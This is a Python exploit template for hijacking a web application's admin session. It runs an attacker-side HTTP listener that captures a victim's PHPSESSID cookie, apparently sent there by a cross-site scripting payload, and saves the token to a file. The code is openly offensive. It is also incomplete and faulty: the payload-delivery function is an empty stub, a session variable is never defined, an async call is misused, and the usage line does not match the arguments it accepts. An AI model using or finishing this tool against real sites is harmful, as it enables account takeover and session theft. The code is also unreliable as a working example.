#!/usr/bin/env python3

import argparse
import traceback
import requests
import http.server
import asyncio
import socketserver
import threading
import time
import sys
import os
import signal
from urllib.parse import urlparse, parse_qs, urljoin

"""
Usage:
/usr/bin/python3 rce.py <target_ip_or_hostname> <attacker_ip> <listener_port>
"""

# Global variables
admin_token_received = False
server_running = False
TARGET_HOST = None  # Will be set from CLI args


class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global admin_token_received

        if self.path.startswith('/token?PHPSESSID='):
            try:
                parsed_url = urlparse(self.path)
                query_params = parse_qs(parsed_url.query)
                admin_token = query_params.get('PHPSESSID', [''])[0]

                if admin_token:
                    print(f"\n[+] Admin token received: {admin_token}")

                    with open("admin_token.txt", "w", encoding="utf-8") as f:
                        f.write(admin_token)

                    admin_token_received = True

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b'Token received successfully!')
                else:
                    print("[-] Empty admin token received")
                    self.send_error(400, "Empty token")

            except Exception as e:
                print(f"[-] Error processing token: {e}")
                self.send_error(500, "Server error")
        else:
            super().do_GET()


def start_http_server(port=8080, timeout=300):
    global server_running
    try:
        with socketserver.TCPServer(("", port), TokenHandler) as httpd:
            server_running = True
            print(f"[+] HTTP Server started on port {port}")
            print(f"[*] Waiting for admin token (timeout: {timeout}s)...")

            httpd.timeout = 1
            start_time = time.time()

            while server_running and (time.time() - start_time) < timeout:
                httpd.handle_request()
                if admin_token_received:
                    print("[+] Token received, shutting down server")
                    break

            if not admin_token_received:
                print(f"[-] Timeout reached ({timeout}s), no token received")

    except PermissionError:
        print(f"[-] Permission denied for port {port}. Try running as root/administrator")
    except OSError as e:
        if e.errno == 98:
            print(f"[-] Port {port} is already in use")
        else:
            print(f"[-] Error starting HTTP server: {e}")
    except Exception as e:
        print(f"[-] Unexpected server error: {e}")
    finally:
        server_running = False


"""
...
FUNCTIONS HERE (if needed)

create an account

login
...
"""

def send_xss_payload_function(target, nrml_session):
    """
    Deliver XSS payload to the victim
    """

def xss(lhost, server_port=8080):
    try:
        server_thread = threading.Thread(target=start_http_server, args=(server_port, 300), daemon=True)
        server_thread.start()

        while not server_running:
            time.sleep(0.1)

        asyncio.run(send_xss_payload_function(lhost, normal_user_token)) # Send XSS payload 

        print("[+] XSS attack delivered successfully!")
        print("[*] Waiting for admin token...")

        timeout = 300
        start_time = time.time()

        while time.time() - start_time < timeout and not admin_token_received:
            time.sleep(1)

        if admin_token_received:
            print("[+] Admin token successfully exfiltrated!")
            return True
        else:
            print("[-] Timeout waiting for admin token")
            return False
    except Exception as e:
        print("[-] Error joining the group with the admin:", e)
        traceback.print_exc()


def signal_handler(sig, frame):
    global server_running
    print("\n[*] Shutting down...")
    server_running = False
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description='Hijack the Admin Session Token')
    parser.add_argument("host", help='Target host/IP address')
    parser.add_argument("lhost", help='Attacker IP address')
    args = parser.parse_args()

    global TARGET_HOST
    TARGET_HOST = args.host

    signal.signal(signal.SIGINT, signal_handler)

    try:
        success = xss(args.lhost)

        if success:
            print("[+] Exploit completed successfully!")
            if os.path.exists("admin_token.txt"):
                with open("admin_token.txt", "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    admin_session_token = content.split(";")[0]  # Take the first part before the semicolon

                    print(f"[+] Admin token saved to admin_token.txt: {admin_session_token}")
            return 0
        else:
            print("[-] Exploit failed")
            return 1
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
